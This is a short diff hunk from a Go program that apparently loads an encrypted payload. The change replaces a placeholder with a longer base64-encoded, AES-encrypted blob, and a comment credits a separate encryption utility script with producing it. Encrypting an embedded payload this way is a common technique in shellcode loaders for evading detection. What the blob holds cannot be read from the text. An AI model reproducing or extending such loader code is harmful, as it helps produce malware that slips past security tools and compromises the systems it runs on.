@@ -129,5 +129,5 @@ func ptr(val interface{}) uintptr {
 	}
 }
 
-// Enter base64 encoded, AES encrypted payload
-var payload = []byte("tWyLE2HibV6oj98kvB2Qgg==")
+// Enter base64 encoded, AES encrypted payload, generated with utility_scripts/payload_encryption_aes.go
+var payload = []byte("MSbKpvMDc62w4BdhcXkAiri0+9hrpKGGtntRgDqiPCEeSDoePLHEHYIHKMj0c0xCUPgUksXhuiOAmvTFY5/f7yHnOv6r4+SAvRahyPtJDVTbAR0QHy5Mmv9MH9Y27L3FuSAuG1orYKr1RO56EDBs7gMRWt67PsBhcGoerNhM3v+G9m2sjupQF1j/7MtFNVMPyTW5M4KvAYpt2MZiIwyEQPQGrKmMnuXqG5kOANiTKjIJdmmEvqkfoyOFUeEC8PzNQnhQqlybafG1tP1bdGotNQ==")
